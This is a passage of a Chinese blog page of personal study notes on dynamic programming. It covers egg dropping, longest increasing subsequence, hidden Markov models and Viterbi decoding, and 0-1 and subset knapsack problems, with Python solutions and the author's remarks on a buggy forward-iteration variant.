重新定义状态转移方程</span><br><span class="hljs-comment"># k:鸡蛋数 m:最少扔鸡蛋次数</span><br><span class="hljs-comment"># 函数返回结果: 最高楼层数</span><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">superEggDrop3</span>(<span class="hljs-params">k,m</span>):<br>    dp = np.zeros((k+<span class="hljs-number">1</span>, m+<span class="hljs-number">1</span>), dtype=<span class="hljs-built_in">int</span>)<br>    n = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> dp[k][m] &lt; m:<br>        n+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,k+<span class="hljs-number">1</span>):<br>            dp[i][n] = dp[i][n-<span class="hljs-number">1</span>] + dp[i-<span class="hljs-number">1</span>][n-<span class="hljs-number">1</span>] + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> dp[k][m]<br><br><span class="hljs-comment"># 测试</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>        k,m=<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入鸡蛋数和最少扔鸡蛋次数，用逗号隔开：&quot;</span>))<br>        <span class="hljs-built_in">print</span>(superEggDrop3(k,m))<br>        <br><span class="hljs-comment"># 该方程一个10*9的dp数组如下</span><br>[[   <span class="hljs-number">0</span>    <span class="hljs-number">0</span>    <span class="hljs-number">0</span>    <span class="hljs-number">0</span>    <span class="hljs-number">0</span>    <span class="hljs-number">0</span>    <span class="hljs-number">0</span>    <span class="hljs-number">0</span>    <span class="hljs-number">0</span>    <span class="hljs-number">0</span>    <span class="hljs-number">0</span>]<br> [   <span class="hljs-number">0</span>    <span class="hljs-number">1</span>    <span class="hljs-number">2</span>    <span class="hljs-number">3</span>    <span class="hljs-number">4</span>    <span class="hljs-number">5</span>    <span class="hljs-number">6</span>    <span class="hljs-number">7</span>    <span class="hljs-number">8</span>    <span class="hljs-number">9</span>   <span class="hljs-number">10</span>]<br> [   <span class="hljs-number">0</span>    <span class="hljs-number">1</span>    <span class="hljs-number">3</span>    <span class="hljs-number">6</span>   <span class="hljs-number">10</span>   <span class="hljs-number">15</span>   <span class="hljs-number">21</span>   <span class="hljs-number">28</span>   <span class="hljs-number">36</span>   <span class="hljs-number">45</span>   <span class="hljs-number">55</span>]<br> [   <span class="hljs-number">0</span>    <span class="hljs-number">1</span>    <span class="hljs-number">3</span>    <span class="hljs-number">7</span>   <span class="hljs-number">14</span>   <span class="hljs-number">25</span>   <span class="hljs-number">41</span>   <span class="hljs-number">63</span>   <span class="hljs-number">92</span>  <span class="hljs-number">129</span>  <span class="hljs-number">175</span>]<br> [   <span class="hljs-number">0</span>    <span class="hljs-number">1</span>    <span class="hljs-number">3</span>    <span class="hljs-number">7</span>   <span class="hljs-number">15</span>   <span class="hljs-number">30</span>   <span class="hljs-number">56</span>   <span class="hljs-number">98</span>  <span class="hljs-number">162</span>  <span class="hljs-number">255</span>  <span class="hljs-number">385</span>]<br> [   <span class="hljs-number">0</span>    <span class="hljs-number">1</span>    <span class="hljs-number">3</span>    <span class="hljs-number">7</span>   <span class="hljs-number">15</span>   <span class="hljs-number">31</span>   <span class="hljs-number">62</span>  <span class="hljs-number">119</span>  <span class="hljs-number">218</span>  <span class="hljs-number">381</span>  <span class="hljs-number">637</span>]<br> [   <span class="hljs-number">0</span>    <span class="hljs-number">1</span>    <span class="hljs-number">3</span>    <span class="hljs-number">7</span>   <span class="hljs-number">15</span>   <span class="hljs-number">31</span>   <span class="hljs-number">63</span>  <span class="hljs-number">126</span>  <span class="hljs-number">246</span>  <span class="hljs-number">465</span>  <span class="hljs-number">847</span>]<br> [   <span class="hljs-number">0</span>    <span class="hljs-number">1</span>    <span class="hljs-number">3</span>    <span class="hljs-number">7</span>   <span class="hljs-number">15</span>   <span class="hljs-number">31</span>   <span class="hljs-number">63</span>  <span class="hljs-number">127</span>  <span class="hljs-number">254</span>  <span class="hljs-number">501</span>  <span class="hljs-number">967</span>]<br> [   <span class="hljs-number">0</span>    <span class="hljs-number">1</span>    <span class="hljs-number">3</span>    <span class="hljs-number">7</span>   <span class="hljs-number">15</span>   <span class="hljs-number">31</span>   <span class="hljs-number">63</span>  <span class="hljs-number">127</span>  <span class="hljs-number">255</span>  <span class="hljs-number">510</span> <span class="hljs-number">1012</span>]<br> [   <span class="hljs-number">0</span>    <span class="hljs-number">1</span>    <span class="hljs-number">3</span>    <span class="hljs-number">7</span>   <span class="hljs-number">15</span>   <span class="hljs-number">31</span>   <span class="hljs-number">63</span>  <span class="hljs-number">127</span>  <span class="hljs-number">255</span>  <span class="hljs-number">511</span> <span class="hljs-number">1022</span>]]<br></code></pre></td></tr></table></figure><h4 id="思考题：最长上升子序列"><a href="#思考题：最长上升子序列" class="headerlink" title="思考题：最长上升子序列"></a>思考题：最长上升子序列</h4><p>问题描述：给定一个无序的整数数组，找到其中最长的上升子序列（不一定连续）的长度。</p><p>定义dp数组：<code>dp[i]</code>表示以<code>nums[i]</code>这个数结尾的最长递增子序列的长度。</p><p>根据这个定义，最终结果应为dp数组中的最大值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">lengthOfLIS</span>(<span class="hljs-params">nums</span>):<br>    dp = [<span class="hljs-number">1</span>] * <span class="hljs-built_in">len</span>(nums)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(nums)):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i):<br>            <span class="hljs-keyword">if</span> nums[i] &gt; nums[j]:<br>                dp[i] = <span class="hljs-built_in">max</span>(dp[i],dp[j]+<span class="hljs-number">1</span>)<br>    res = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(dp)):<br>        res = <span class="hljs-built_in">max</span>(res,dp[i])<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-comment"># 测试</span><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>        nums=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入序列：&quot;</span>)<br>        <span class="hljs-built_in">print</span>(lengthOfLIS(nums))<br></code></pre></td></tr></table></figure><h4 id="思考题：背包问题（组合优化）"><a href="#思考题：背包问题（组合优化）" class="headerlink" title="思考题：背包问题（组合优化）"></a>思考题：背包问题（组合优化）</h4><p>0-1背包</p><h3 id="3、马尔科夫链-x2F-最长上升子序列-x2F-背包问题-x2F-贪婪算法"><a href="#3、马尔科夫链-x2F-最长上升子序列-x2F-背包问题-x2F-贪婪算法" class="headerlink" title="3、马尔科夫链&#x2F;最长上升子序列&#x2F;背包问题&#x2F;贪婪算法"></a>3、马尔科夫链&#x2F;最长上升子序列&#x2F;背包问题&#x2F;贪婪算法</h3><h4 id="马尔科夫链"><a href="#马尔科夫链" class="headerlink" title="马尔科夫链"></a>马尔科夫链</h4><ul><li>以一维可数集为索引的离散随机变量：$X&#x3D;\left{X_n|n&gt;0\right}$</li><li>随机变量的取值为一个可数集（状态空间）的元素：$X &#x3D; s_i,s_i\in s$</li><li>满足马尔科夫性质：$p(X_{t+1} | X_t,…X_1) &#x3D; p(X_{t+1} | X_t)$</li></ul><h4 id="隐马尔科夫模型（HMM）"><a href="#隐马尔科夫模型（HMM）" class="headerlink" title="隐马尔科夫模型（HMM）"></a>隐马尔科夫模型（HMM）</h4><ul><li>状态不能直接观察，但是可以生成一个可以测量的输出对象</li><li>输出是一个依赖于状态的随机变量</li><li>应用：语音识别、自然语言处理</li><li>关键问题与算法<ul><li>评估问题：前向算法（给观测序列<code>O</code>，）</li><li>解码问题：Viterbi算法</li><li>学习问题：向前向后算法</li></ul></li></ul><p><strong>模型表达：2个状态集合和3个概率矩阵</strong></p><ol><li>隐含状态 $S$</li><li>可观测状态 $O$</li><li>初始状态概率矩阵 $\pi$</li><li>隐含状态转移概率矩阵 $A$</li><li>观测状态转移概率矩阵 $B$</li></ol><p>总结：一般的，可以用 $\lambda &#x3D; (A,B,\pi)$ 三元组来简洁的表示一个隐马尔科夫模型。 隐马尔可夫模型实际上是标准马尔可夫模型的扩展，添加了可观测状态集合和这些状态与隐含状态之间的概率关系。</p><blockquote><p>例：盒子模球实验</p><p>有三个盒子，编号分别为1号、2号和3号，每个盒子里有个数不等的黑球和白球：</p><ul><li>1号：黑球2个，白球8个</li><li>2号：黑球6个，白球4个</li><li>3号：黑球4个，白球6个</li></ul><p>据此可得<strong>观测概率矩阵</strong>：$$B&#x3D;\begin{pmatrix} 0.2 &amp; 0.8 \ 0.6 &amp; 0.4 \ 0.4 &amp; 0.6 \end{pmatrix}$$</p><p>实验过程：</p><p>每次随机出现一个盒子，然后从随机出现的盒子中随机摸一个球，记录下求得颜色，然后把球放回盒子。重复以上。</p><p>试验过程中，我们只能在每次摸出球后看到被摸出的球的颜色（可观测状态），但无法知道每次随机出现的盒子的编号（隐含状态）。</p><p>记录<strong>可观测状态</strong>：$O&#x3D;\left{黑，黑，白，白，白，黑，黑\right}$</p><p>假定第一次个盒子出现的概率分布为：1号0.3，2号0.5，3号0.2</p><p>可得<strong>初始状态概率矩阵：</strong> $\pi &#x3D; (0.3,0.5,0.2)^T$</p><p>提炼<strong>隐含状态转移概率矩阵：</strong> $ A &#x3D; \begin{bmatrix} 0.4 &amp; 0.4 &amp; 0.2 \ 0.3 &amp; 0.2 &amp; 0.5 \ 0.2 &amp; 0.6 &amp; 0.2 \end{bmatrix}$</p><blockquote><p>李姐状态转移矩阵：第一行：随机到1号后，再次随机，1号出现的概率是0.4，2号出现的概率是0.4，3号出现的概率是0.2。以此类推。</p></blockquote><p>参考：<a href="https://www.zhihu.com/question/19633865/answer/1635328825">https://www.zhihu.com/question/19633865/answer/1635328825</a></p></blockquote><p><strong>主要关注：viterbi算法</strong></p><ul><li>最大似然解码：给定观察到的信道输出，找到最有可能的输入。</li><li>广泛应用于通信系统中，用于解码由有限状态过程编码的数据序列</li><li>求解：$maxP(1|0,\theta)$</li></ul><h4 id="动态规划的要素"><a href="#动态规划的要素" class="headerlink" title="动态规划的要素"></a>动态规划的要素</h4><p>状态：需要保留的信息是什么？</p><p>状态转移：信息交换与更新的过程</p><p>权重与损失函数：局部评价指标、最终目标</p><p>优化过程：寻找最优解</p><h4 id="最长上升子序列"><a href="#最长上升子序列" class="headerlink" title="最长上升子序列"></a>最长上升子序列</h4><p>暴力：共$2^n$个子序列</p><p>老师讲的解法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">lengthOfLIS2</span>(<span class="hljs-params">nums</span>):<br>    dp = [<span class="hljs-number">1</span>] * <span class="hljs-built_in">len</span>(nums)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(nums)):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i+<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(nums)):<br>            <span class="hljs-keyword">if</span> nums[j] &gt; nums[i] <span class="hljs-keyword">and</span> dp[j] &lt; dp[i]+<span class="hljs-number">1</span>:<br>                dp[j] = dp[i] + <span class="hljs-number">1</span><br>    res = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(dp)):<br>        <span class="hljs-keyword">if</span> dp[i] &gt; res:<br>            res = dp[i]<br>    <span class="hljs-keyword">return</span> res<br></code></pre></td></tr></table></figure><h4 id="背包问题：组合优化"><a href="#背包问题：组合优化" class="headerlink" title="背包问题：组合优化"></a>背包问题：组合优化</h4><p>问题描述：容量重量有限，求价值最大的方案</p><blockquote><p>Knapsack Problem是NP难问题，没有多项式时间解</p></blockquote><p><strong>0-1背包问题</strong></p><p><strong>问题描述：</strong></p><p>N件物品可放入背包，第i件物品的重量为w[i]，价值为v[i]。要求在总重量不超过上限W的情况下，装入背包的物品价值最大。</p><p>0-1决策：装或者不装</p><p>确定目标函数，指示函数d(i) &#x3D; {0,1}</p><p>$max_d \sum_{i&#x3D;1}^N d(i)V(i)$, subject to $\sum d(i)W(i) \leq W$</p><p>假设W，W(i)离散</p><p>已知条件：装了多少件物品，还可以装多重的东西</p><p>考虑的依据：不超过重量限制时，选择下一件物品使总价值最大</p><p><strong>解题思路：</strong></p><p>构建一个二维表<code>V[i][j]</code>：在重量限制<code>j</code>时，选择了<code>&#123;1,2，...，i&#125;</code>件物品的最大价值</p><p>表的上限<code>V[N][W]</code>：装<code>N</code>件物品，重量<code>W</code></p><p>分析状态转移：第<code>i</code>件物品要么装入背包，要么不装入背包</p><p>装入背包：<code>V[i][j] = V[i-1][j-W[i]] + v[i]</code></p><p>不装入背包：<code>V[i][j] = V[i-1][j]</code></p><p>决策依据：$V[i][j] &#x3D; max(V[i-1][j], V[i-1][j-W[i]] + v[i])$</p><p><strong>背包问题解的优化：</strong></p><p>伪多项式时间<code>O(NW)</code></p><p>进一步分析，不需要显式表示物品序号，可简化为一维表：</p><p><code>i</code>为不同的重量限制，<code>j</code>遍历每个物品</p><p>$V[i] &#x3D; max_j(V[i], V[i-w[j]]+v[j])$，其中，$V[W] &#x3D; 0$</p><blockquote><p><strong>一种解法（二维数组）</strong></p><p>&#x3D;&#x3D;step1：明确【状态】和【选择】&#x3D;&#x3D;</p><p>状态：【背包的容量】、【可选择的物品】</p><p>选择：【装进背包】、【不装进背包】</p><p>套框架：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;<span class="hljs-keyword">for</span> 状态<span class="hljs-number">1</span> <span class="hljs-keyword">in</span> 状态<span class="hljs-number">1</span>的所有取值:<br>&gt;<span class="hljs-keyword">for</span> 状态<span class="hljs-number">2</span> <span class="hljs-keyword">in</span> 状态<span class="hljs-number">2</span>的所有取值:<br>&gt;<span class="hljs-keyword">for</span> ...<br>dp[状态<span class="hljs-number">1</span>][状态<span class="hljs-number">2</span>][...] = 择优(选择<span class="hljs-number">1</span>,选择<span class="hljs-number">2</span>,...)<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;step2：明确dp数组的定义&#x3D;&#x3D;</p><p>dp数组即描述问题局面的一个数组，上节明确了本题有两个状态，也就是说需要一个二维的dp数组，一维是可选择的物品，一维是背包的容量。</p><p>于是对dp数组定义：对于前<code>i</code>个物品，当前背包的容量为<code>w</code>，这种情况下可以装的最大价值是<code>dp[i][w]</code>。</p><p>根据这个定义，我们最终想求的答案就是<code>dp[N][W]</code>，base case为<code>dp[0][...] = dp[...][0] = 0</code>，因为没有物品或者背包没有空间时，能装的最大价值就是0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;<span class="hljs-comment"># 细化框架</span><br>&gt;dp = np.zeros((N+<span class="hljs-number">1</span>, W+<span class="hljs-number">1</span>), dtype=<span class="hljs-built_in">int</span><br>&gt;<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1.</span>.N]:<br>&gt;<span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> [<span class="hljs-number">1.</span>.W]:<br>&gt;dp[i][w] = <span class="hljs-built_in">max</span>(<br> 把物品 i 装进背包,<br> 不把物品 i 装进背包<br>&gt;)<br>&gt;<span class="hljs-keyword">return</span> dp[N][W]<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;step3：根据【选择】，思考状态转移的逻辑&#x3D;&#x3D;</p><p>装入背包：<code>dp[i][W] = V[i-1][j-W[i-1]] + v[i-1]</code></p><p>不装入背包：<code>dp[i][W] = V[i-1][w]</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;<span class="hljs-comment"># 细化代码</span><br>&gt;<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1.</span>.N]:<br>&gt;<span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> [<span class="hljs-number">1.</span>.W]:<br>&gt;dp[i][w] = <span class="hljs-built_in">max</span>(<br> dp[i-<span class="hljs-number">1</span>][w],<br> dp[i-<span class="hljs-number">1</span>][w - wt[i-<span class="hljs-number">1</span>]] + val[i-<span class="hljs-number">1</span>]<br>&gt;)<br>&gt;<span class="hljs-keyword">return</span> dp[N][W]<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;step4：写成代码，处理边界情况&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;<span class="hljs-keyword">def</span> <span class="hljs-title function_">knapsack2</span>(<span class="hljs-params">W,N,weight,value</span>):<br>&gt;<span class="hljs-comment"># 初始化全为0</span><br>&gt;dp = np.zeros((N+<span class="hljs-number">1</span>,W+<span class="hljs-number">1</span>), dtype=<span class="hljs-built_in">int</span>)<br>&gt;<span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,N+<span class="hljs-number">1</span>):<br>  <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,W+<span class="hljs-number">1</span>):<br>      <span class="hljs-keyword">if</span> w &lt; weight[n-<span class="hljs-number">1</span>]:<br>          <span class="hljs-comment"># 装不下</span><br>          dp[n][w] = dp[n-<span class="hljs-number">1</span>][w]<br>      <span class="hljs-keyword">else</span>:<br>          <span class="hljs-comment"># 择优：装/不装</span><br>          dp[n][w] = <span class="hljs-built_in">max</span>(dp[n-<span class="hljs-number">1</span>][w-weight[n-<span class="hljs-number">1</span>]]+value[n-<span class="hljs-number">1</span>],dp[n-<span class="hljs-number">1</span>][w])<br>&gt;<span class="hljs-keyword">return</span> dp[N][W]<br></code></pre></td></tr></table></figure></blockquote><p>优化为一维数组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># W:背包能承受的重量 N:物品的数量 weight:每个物品的重量 value:每个物品的价值</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">knapsack3</span>(<span class="hljs-params">W,N,weight,value</span>):<br>    dp = [<span class="hljs-number">0</span>]*(W+<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,W+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(weight)):<br>            <span class="hljs-keyword">if</span> w &gt;= weight[i]:<br>                dp[w] = <span class="hljs-built_in">max</span>(dp[w],dp[w-weight[i]]+value[i])<br>        <span class="hljs-built_in">print</span>(dp)<br>    <span class="hljs-keyword">return</span> dp<br></code></pre></td></tr></table></figure><blockquote><p>写个小坑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 简化为一维数组</span><br><span class="hljs-comment"># W:背包能承受的重量 N:物品的数量 weight:每个物品的重量 value:每个物品的价值</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">knapsack3</span>(<span class="hljs-params">W,N,weight,value</span>):<br> dp = [<span class="hljs-number">0</span>]*(W+<span class="hljs-number">1</span>)<br> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N):<br>     <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,W+<span class="hljs-number">1</span>):<br>         <span class="hljs-keyword">if</span> w &gt;= weight[i]:<br>             dp[w] = <span class="hljs-built_in">max</span>(dp[w],dp[w-weight[i]]+value[i])<br>     <span class="hljs-built_in">print</span>(dp)<br> <span class="hljs-keyword">return</span> dp<br><br> <span class="hljs-comment"># 另一种遍历</span><br> <span class="hljs-comment"># for w in range(1,W+1):</span><br>     <span class="hljs-comment"># for i in range(N):</span><br>     <span class="hljs-comment">#     if w &gt;= weight[i]:</span><br>     <span class="hljs-comment">#         dp[w] = max(dp[w],dp[w-weight[i]]+value[i])</span><br>     <span class="hljs-comment"># print(dp)</span><br><br><span class="hljs-comment"># 输入：10,6,[2,2,3,1,5,2],[2,3,1,5,4,3]</span><br><span class="hljs-comment"># 输出：[0, 5, 10, 15, 20, 25, 30, 35, 40, 45, 50]</span><br></code></pre></td></tr></table></figure><p>这里也是尝试写成一维数组，与上面方法不同的是从正向遍历，导致<code>dp[w-weight[i]]</code>拿到的数据可能包含了第<code>i</code>个物品，导致了重复。尝试了加flag之类的，但似乎正向遍历的方法没法做。</p></blockquote><h5 id="背包问题的变体"><a href="#背包问题的变体" class="headerlink" title="背包问题的变体"></a>背包问题的变体</h5><h6 id="子集背包问题"><a href="#子集背包问题" class="headerlink" title="子集背包问题"></a>子集背包问题</h6><p>例：<a href="https://leetcode-cn.com/problems/partition-equal-subset-sum/">https://leetcode-cn.com/problems/partition-equal-subset-sum/</a></p><p>分割等和子集：给定一个只包含正整数的非空数组，是否可以将这个数组分割成两个子集，使得两个子集的元素和相等。</p><p><strong>问题转换：</strong></p><p><code>sum</code>为物品总重量，给一个可装载重量为<code>sum/2</code>的背包和<code>N</code>个物品，每个物品重量为<code>weight[i]</code>，是否存在一种装法，能够恰好将背包装满。</p><p>1、明确【状态】和【选择】：</p><p>状态：【背包的容量】、【可选择的物品】</p><p>选择：【装进背包】、【不装进背包】</p><p>2、明确dp数组定义：</p><p><code>dp[i][j]</code>表示对于前<code>i</code>个物品，当前背包的容量为<code>j</code>时，若<code>x</code>为<code>True</code>，则说明可以恰好将背包装满，若<code>x</code>为<code>False</code>，则说明不能恰好将背包装满。</p><p>根据这个定义，我们想求的最终答案即为<code>dp[N][sum/2]</code>。</p><p>base case为<code>dp[...][0] = True</code>和<code>dp[0][...]=False</code></p><blockquote><p>背包没有空间：装满了</p><p>没有物品可选：无法装满</p></blockquote><p>3、根据【选择】，思考状态转移的逻辑</p><p>判断是否可装入：<code>weight[i-1] &lt;= j</code></p><p>装入背包：<code>dp[i][j] = dp[i-1][j-weight[i-1]]</code></p><p>不装入背包：<code>dp[i][j] = dp[i-1][j]</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">knapsack_divide</span>(<span class="hljs-params">weight</span>):<br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> weight: <span class="hljs-built_in">sum</span> += w<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sum</span>%<span class="hljs-number">2</span> != <span class="hljs-number">0</span>): <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-built_in">sum</span> = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">sum</span>/<span class="hljs-number">2</span>)<br>    dp = np.full((<span class="hljs-built_in">int</span>(<span class="hljs-built_in">len</span>(weight)+<span class="hljs-number">1</span>),<span class="hljs-built_in">sum</span>+<span class="hljs-number">1</span>),<span class="hljs-literal">False</span>,dtype=<span class="hljs-built_in">bool</span>)<br>    <span class="hljs-comment"># base case</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(weight)):<br>        dp[i][<span class="hljs-number">0</span>] = <span class="hljs-literal">True</span><br>    <span class="hljs-comment"># 状态转换</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(weight)+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">sum</span>+<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> j-weight[i-<span class="hljs-number">1</span>]&lt;<span class="hljs-number">0</span>:<br>                <span class="hljs-comment"># 背包容量不足</span><br>                dp[i][j] = dp[i-<span class="hljs-number">1</span>][j]<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 选择装入或不装入</span><br>                dp[i][j] = dp[i-<span class="hljs-number">1</span>][j] | dp[i-<span class="hljs-number">1</span>][j-weight[i-<span class="hljs-number">1</span>]]<br>    <span class="hljs-keyword">return</span> dp[<span class="hljs-built_in">len</span>(weight)][<span class="hljs-built_in">sum</span>]<br></code></pre></td></tr></table></figure><p>4、优化：状态压缩</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 状态压缩</span><br><span class="hljs-comment"># weight: 物品重量数组</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">knapsack_divide2</span>(<span class="hljs-params">weight</span>):<br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> weight: <span class="hljs-built_in">sum</span> += w<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sum</span>%<span class="hljs-number">2</span> != <span class="hljs-number">0</span>): <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-built_in">sum</span> = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">sum</span>/<span class="hljs-number">2</span>)<br>    dp = [<span class="hljs-literal">False</span>] * (<span class="hljs-built_in">sum</span>+<span class="hljs-number">1</span>)<br>    dp[<span class="hljs-number">0</span>] = <span class="hljs-literal">True</span><br>    <span class="hljs-comment"># 状态转换</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(weight)):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">sum</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> j &gt;= weight[i]:<br>                dp[j] = dp[j] | dp[j-weight[i]]<br>    <span class="hljs-keyword">return</span> dp[<span 